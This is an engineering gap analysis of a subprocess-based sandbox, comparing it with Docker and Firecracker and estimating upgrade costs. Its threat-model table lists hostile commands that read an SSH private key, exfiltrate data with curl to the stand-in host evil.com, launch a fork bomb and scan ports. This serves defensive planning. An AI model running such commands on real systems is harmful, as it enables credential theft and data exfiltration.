# Sandbox v1 — Gap Analysis vs Full Docker (Faixa 2)

**Status:** v1 shipped 2026-05-25 in `safety/sandbox.py`. This document
honestly maps what v1 covers vs what a full Docker/Firecracker
implementation would add. Use this when a buyer/auditor asks "is your
sandbox real?"

## What v1 IS

A `subprocess.run` wrapper that adds 6 layers of defense-in-depth:

1. **Env-var allowlist** — subprocess sees only `SAFE_ENV_DEFAULTS` +
   explicit `env_allowlist`, never the parent's full environment
2. **Deny-list overrides** — `DARIO_GH_TOKEN`, AWS keys, `DARIO_MASTER_SECRET`,
   `SSH_AUTH_SOCK` BLOCKED even if allowlisted (defence-in-depth)
3. **Cwd jail** — fresh `tempfile.mkdtemp("dario-sandbox-")`, TMP/TEMP/TMPDIR
   all pinned inside, cleaned up after run
4. **Wall-clock timeout** — hard kill via `subprocess.TimeoutExpired`
5. **POSIX rlimits** — CPU + memory caps via `resource.setrlimit` (Linux/Mac
   only; Windows: best-effort note in `result.notes`)
6. **Audit trail** — every sandboxed execution records actor/cmd/exit/duration
   to dario.audit (which is Ed25519-signed from Faixa 1 #5)

## What v1 is NOT

A real sandbox. The subprocess still runs as the **same OS user** with
the **same file-system access** and **same network access** as the parent.

| Attack | v1 outcome |
|---|---|
| `cat ~/.ssh/id_rsa` | **succeeds** (cwd jail doesn't prevent read of parent paths) |
| `curl evil.com/exfil -d "$(cat data.txt)"` | **succeeds** (no network policy) |
| `kill -9 <other dario process>` | **succeeds** (no PID namespace) |
| `python -c "import socket; socket.socket().bind((':',8000))"` | **succeeds** |
| `nmap localhost` | **succeeds** |
| `os.system("powershell -c Get-Process")` | **succeeds** |
| Fork bomb `:(){ :|:& };:` | **CPU rlimit kills it on POSIX**; Windows best-effort |
| Mass file creation in `/tmp` | **succeeds** (only cwd is sandbox dir) |

**The honest summary:** v1 raises the bar from "trivial" to "requires
intentional effort." A motivated attacker with skill execution access
will still succeed at most exfiltration. v1 is *most useful* against
accidental leakage and unsophisticated probes.

## Threat coverage estimate

| Threat category | No sandbox | v1 (subprocess) | v2 (Docker) | v3 (Firecracker+netns) |
|---|---|---|---|---|
| Env-var exfil | 0% | 90% | 95% | 99% |
| Filesystem secrets | 0% | 10% (only via cwd jail) | 95% | 99% |
| Network exfil | 0% | 0% | 95% (with netpolicy) | 99% |
| CPU exhaustion | 0% | 80% (POSIX) / 40% (Win) | 99% | 99% |
| Memory exhaustion | 0% | 80% (POSIX) / 40% (Win) | 99% | 99% |
| Process tree manipulation | 0% | 0% | 99% (PID ns) | 99% |
| Kernel exploit | 0% | 0% | 50% (shared kernel) | 90% (VM boundary) |

**Composite v1: ~40% reduction in attack surface vs no-sandbox.**

Same metric for Docker: ~80%. Firecracker/Kata: ~95%.

## What buying Docker would cost

To upgrade v1 → Docker (Faixa 2):

| Item | Estimate |
|---|---|
| Base image build (debian + Python + DARIO deps) | 8h |
| `safety/sandbox_docker.py` wrapper with bind mounts, network policy, resource limits via `cgroups` | 24h |
| Per-skill image variants for skills with native deps | 16h |
| Image build automation in CI | 8h |
| Restore/rollback procedures | 4h |
| Performance tuning (startup latency from ~5s to <1s using `docker exec` into long-lived container) | 16h |
| Tests + integration with executor.py | 16h |
| Docs + operator runbook | 4h |
| **Total** | **~96h** (was 80h estimate; refined after v1) |

Plus ongoing maintenance: ~2h/month rebuilding images for CVE fixes.

## When to upgrade v1 → v2

Trigger conditions (any one):
1. First B2B customer asks for SOC2 attestation
2. First incident involving skill abuse (real or near-miss)
3. Multi-tenant deployment with untrusted tenants
4. Compliance requirement (HIPAA, PCI-DSS) drops in scope
5. >50 skill executions per day average (current: ~10)

Until then, v1 is the rational defense level for solo + 5-client consulting.

## How to use v1 today

For any new code path that runs user-supplied or skill-generated commands:

```python
from safety.sandbox import run_sandboxed

result = run_sandboxed(
    cmd=["python", "skill_script.py", str(input_arg)],
    caller="executor/skill-X",
    env_allowlist=["ANTHROPIC_API_KEY"],  # only what's needed
    timeout_s=120,
    memory_mb=512,
)

if not result.ok:
    raise RuntimeError(f"Sandbox failure: rc={result.returncode}, timeout={result.timeout_hit}")

# stdout/stderr captured — pass to prompt_shield.inspect_output()
# before showing to user, in case secrets leaked
from safety.prompt_shield import inspect_output
verdict = inspect_output(result.stdout)
clean = verdict["sanitized"]
```

For legacy code paths that use raw `subprocess.run` or `run_engine(...)`:
**not yet rewired** — that's a follow-up integration. The shield is
optional today; will become mandatory once the executor wraps all
dispatch calls through it.

## Roadmap

- [x] v1 subprocess sandbox (this commit, 2026-05-25)
- [ ] Integrate into executor.py `run_engine` (next session)
- [ ] Wire `prompt_shield.inspect_output` on all `result.stdout` flows
- [ ] v2 Docker wrapper (Faixa 2, conditional on trigger)
- [ ] v3 Firecracker (Faixa 3, only if multi-tenant SaaS pivot)
